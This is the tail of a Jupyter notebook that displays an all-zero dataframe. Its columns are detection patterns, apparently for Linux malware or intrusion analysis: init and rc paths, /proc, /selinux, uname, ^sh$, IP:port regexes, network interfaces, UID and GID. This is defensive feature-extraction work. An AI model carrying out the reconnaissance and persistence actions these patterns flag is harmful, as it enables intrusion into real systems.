       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>15 rows × 24 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "    bin/sed  /etc/rc  /etc/init.d/  /proc/  /etc/sed  /selinux  /sys/  bin/  \\\n",
       "0         0        0             0       0         0         0      0     0   \n",
       "1         0        0             0       0         0         0      0     0   \n",
       "2         0        0             0       0         0         0      0     0   \n",
       "3         0        0             0       0         0         0      0     0   \n",
       "4         0        0             0       0         0         0      0     0   \n",
       "5         0        0             0       0         0         0      0     0   \n",
       "6         0        0             0       0         0         0      0     0   \n",
       "7         0        0             0       0         0         0      0     0   \n",
       "8         0        0             0       0         0         0      0     0   \n",
       "9         0        0             0       0         0         0      0     0   \n",
       "10        0        0             0       0         0         0      0     0   \n",
       "11        0        0             0       0         0         0      0     0   \n",
       "12        0        0             0       0         0         0      0     0   \n",
       "13        0        0             0       0         0         0      0     0   \n",
       "14        0        0             0       0         0         0      0     0   \n",
       "\n",
       "    lsb-release  uname(.)($)  ...  ^sh$  ^sed$  \\\n",
       "0             0            0  ...     0      0   \n",
       "1             0            0  ...     0      0   \n",
       "2             0            0  ...     0      0   \n",
       "3             0            0  ...     0      0   \n",
       "4             0            0  ...     0      0   \n",
       "5             0            0  ...     0      0   \n",
       "6             0            0  ...     0      0   \n",
       "7             0            0  ...     0      0   \n",
       "8             0            0  ...     0      0   \n",
       "9             0            0  ...     0      0   \n",
       "10            0            0  ...     0      0   \n",
       "11            0            0  ...     0      0   \n",
       "12            0            0  ...     0      0   \n",
       "13            0            0  ...     0      0   \n",
       "14            0            0  ...     0      0   \n",
       "\n",
       "    \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+  \\\n",
       "0                                        0   \n",
       "1                                        0   \n",
       "2                                        0   \n",
       "3                                        0   \n",
       "4                                        0   \n",
       "5                                        0   \n",
       "6                                        0   \n",
       "7                                        0   \n",
       "8                                        0   \n",
       "9                                        0   \n",
       "10                                       0   \n",
       "11                                       0   \n",
       "12                                       0   \n",
       "13                                       0   \n",
       "14                                       0   \n",
       "\n",
       "    \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}  eth[0-9]$  0x[0-9a-zA-Z]{8}  \\\n",
       "0                                    0          0                 0   \n",
       "1                                    0          0                 0   \n",
       "2                                    0          0                 0   \n",
       "3                                    0          0                 0   \n",
       "4                                    0          0                 0   \n",
       "5                                    0          0                 0   \n",
       "6                                    0          0                 0   \n",
       "7                                    0          0                 0   \n",
       "8                                    0          0                 0   \n",
       "9                                    0          0                 0   \n",
       "10                                   0          0                 0   \n",
       "11                                   0          0                 0   \n",
       "12                                   0          0                 0   \n",
       "13                                   0          0                 0   \n",
       "14                                   0          0                 0   \n",
       "\n",
       "    permission:{0,1}[0-9]{0,4}  UID  GID  match  \n",
       "0                            0    0    0      0  \n",
       "1                            0    0    0      0  \n",
       "2                            0    0    0      0  \n",
       "3                            0    0    0      0  \n",
       "4                            0    0    0      0  \n",
       "5                            0    0    0      0  \n",
       "6                            0    0    0      0  \n",
       "7                            0    0    0      0  \n",
       "8                            0    0    0      0  \n",
       "9                            0    0    0      0  \n",
       "10                           0    0    0      0  \n",
       "11                           0    0    0      0  \n",
       "12                           0    0    0      0  \n",
       "13                           0    0    0      0  \n",
       "14                           0    0    0      0  \n",
       "\n",
       "[15 rows x 24 columns]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "for rem in fset.rem_lst:\n",
    "    display(rem.get_match_sentences())\n",
    "    break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "125a1d8b627fe68767755740015967bae857d08bb92fb3fd0d9d8ed24f978d39"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
